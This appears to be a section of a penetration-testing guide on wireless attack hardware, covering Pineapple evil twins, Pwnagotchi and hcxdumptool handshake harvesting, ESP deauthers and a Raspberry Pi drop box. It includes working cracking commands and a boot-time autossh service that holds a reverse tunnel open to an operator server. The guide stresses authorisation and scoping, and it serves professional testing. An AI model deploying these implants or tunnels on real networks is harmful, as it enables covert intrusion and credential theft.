# Wireless - Hardware, implants and drop boxes

## When dedicated hardware beats a laptop

**Trigger:** An engagement needs unattended capture, remote access, a covert footprint, or coverage a single laptop card cannot give.

A laptop with a good USB adapter handles most wireless testing, so reach for dedicated hardware only when it buys something a laptop cannot: an implant left on site captures over hours or days without an operator present; a purpose-built AP platform runs multiple radios and rogue-AP logic more cleanly than juggling `hostapd` interfaces; and a small covert device fits where a laptop is conspicuous. The trade-off is that every implant is a physical asset placed in the client's environment — it must be authorised explicitly, inventoried, retrievable, and its stored captures protected, because a lost drop box full of handshakes is a breach you caused. Match the tool to the need rather than defaulting to the exotic option: for a standard on-site test the laptop is faster to set up and easier to trust.

```text
Need                                   -> Tool
unattended handshake/PMKID harvest     -> Pwnagotchi, or a Pi + hcxdumptool
multi-radio rogue AP platform          -> WiFi Pineapple (Mark VII)
covert deauth / evil portal            -> ESP32 (Marauder), ESP8266 deauther
pocket recon + attacks                 -> Flipper Zero + WiFi devboard
persistent remote foothold on site     -> Raspberry Pi drop box + reverse tunnel
```

Source: Operator practice

## WiFi Pineapple as a rogue-AP platform

**Trigger:** You want managed multi-radio recon, PineAP evil-twin logic, and a web-driven captive portal without hand-building hostapd.

The WiFi Pineapple (current line: Mark VII) is a purpose-built rogue-AP appliance: two or more radios, a web UI, and PineAP — its karma/evil-twin engine that answers client probes, impersonates preferred networks, and steers clients onto the device, with modules for captive portals, credential capture and recon. Its value over a laptop is operational cleanliness for the evil-twin workflow specifically — one radio surveys while another runs the rogue AP, and the portal, DHCP and DNS are managed rather than assembled from `dnsmasq` and `nft` by hand. The same caveats as any rogue AP apply and are amplified by how easy it makes them: scope the PineAP allow/deny lists to authorised clients so strangers cannot associate, and remember a wireless IPS will detect and may contain it. Treat it as `hostapd-mana` plus `wifiphisher` in a box, not as a different capability.

```text
Mark VII workflow:
  Recon        -> survey APs and clients, pick targets
  PineAP       -> Impersonation (answer probes) + allow/deny MAC filter (SCOPE THIS)
  Evil Portal / Captive Portal module -> harvest credentials
  Modules      -> handshake capture, recon dashboards
Underlying tools are the same as rogue-ap-and-karma.md and open-and-guest-networks.md.
```

Source: Operator practice; Hak5 WiFi Pineapple

## Pwnagotchi and Pi-based unattended harvesting

**Trigger:** You want to collect PMKIDs and handshakes across a site over time with no operator present.

A Pwnagotchi is a Raspberry Pi Zero running a purpose-built firmware that continuously and automatically captures PMKIDs and 4-way handshakes from every network in range, writing them to disk as pcaps for later offline cracking — an unattended harvester you leave running while you do other work, or leave placed (with authorisation) to collect over a shift. It deauthenticates opportunistically to force handshakes, so on a production network it is not passive and must be scoped and authorised like any deauth activity. The generic equivalent, and often the better-controlled one for an engagement, is a Raspberry Pi with an injection-capable adapter running `hcxdumptool` filtered to authorised BSSIDs — same outcome, explicit scope, no opaque firmware. Either way the output is a directory of captures that convert with `hcxpcapngtool` and feed the cracking pipeline; the value is time-on-target, collecting material that a brief on-site window would miss.

```bash
# Controlled Pi harvester, scoped to authorised BSSIDs
printf '%s\n' AABBCCDDEEFF 001122334455 > /root/targets.txt
sudo hcxdumptool -i wlan0 -w /root/harvest.pcapng \
  --filterlist_ap=/root/targets.txt --filtermode=2 --enable_status=3

# Later, offline
hcxpcapngtool -o /root/harvest.22000 /root/harvest.pcapng
hashcat -m 22000 /root/harvest.22000 wordlist.txt
```

Source: Operator practice; Pwnagotchi project

## ESP8266/ESP32 and Flipper Zero: pocket attack devices

**Trigger:** A covert or low-profile deauth, beacon-flood, evil-portal or quick recon capability is wanted, without carrying a laptop.

Cheap microcontroller boards run capable 2.4 GHz attack firmware and fit in a pocket. An **ESP8266** flashed with a deauther performs targeted deauthentication and beacon/probe flooding — a client-side DoS and handshake-forcing tool, 2.4 GHz only, no injection of arbitrary frames. An **ESP32** running **Marauder** (also the firmware for the Flipper Zero WiFi devboard) adds recon, PMKID/EAPOL capture to SD card, evil-portal credential harvesting, and packet monitoring. The **Flipper Zero** with that devboard becomes a pocket wireless recon-and-attack tool with a screen. Their limits are real and worth stating in a report: 2.4 GHz only (they cannot touch a 5 GHz-only network), limited to the firmware's built-in attacks, and easily detected. Their value is covertness and convenience for the subset of attacks they support — a quick deauth to force a handshake, an evil portal in a waiting room, recon without opening a laptop.

```text
ESP8266 deauther   : targeted deauth, beacon/probe flood (2.4 GHz)
ESP32 Marauder     : recon, PMKID/EAPOL capture to SD, evil portal, sniffing (2.4 GHz)
Flipper Zero + WiFi devboard : Marauder firmware -> pocket recon + deauth + portal
Limits: 2.4 GHz only; firmware-fixed attack set; no 5 GHz; readily detected by a WIPS.
Captured EAPOL/PMKID -> hcxpcapngtool -> hashcat 22000, same pipeline as everything else.
```

Source: Operator practice; ESP8266 Deauther, ESP32 Marauder

## Raspberry Pi drop box with a remote foothold

**Trigger:** Persistent on-site access is authorised and the wireless attack host needs to be reachable remotely.

A drop box is a small computer left on the client's premises (with explicit authorisation) that gives a remote operator a persistent foothold — for wireless work, a Raspberry Pi with an injection-capable adapter that connects out to attacker-controlled infrastructure and holds a reverse tunnel open, so the wireless attacks can be driven from off site over the days a real engagement runs. The engineering that makes it reliable: it must phone home on boot without intervention (a systemd service running an autossh reverse tunnel or a WireGuard link), survive reboots and network blips, and fail safe. Because it is a persistent implant with a live inbound path, it is the highest-sensitivity asset in the engagement — authorised in writing, inventoried, encrypted at rest, and retrieved and wiped at the end. The wireless testing over it is identical to a local run; the drop box only changes *where the operator sits*.

```bash
# Reverse SSH tunnel home, kept alive, as a boot service
cat >/etc/systemd/system/callhome.service <<'EOF'
[Unit]
Description=callhome
After=network-online.target
[Service]
ExecStart=/usr/bin/autossh -M 0 -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
  -R 22022:localhost:22 operator@vps.example.net
Restart=always
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable --now callhome.service
# operator side: ssh -p 22022 pi@localhost  -> drive the wireless attacks remotely
```

Source: Operator practice
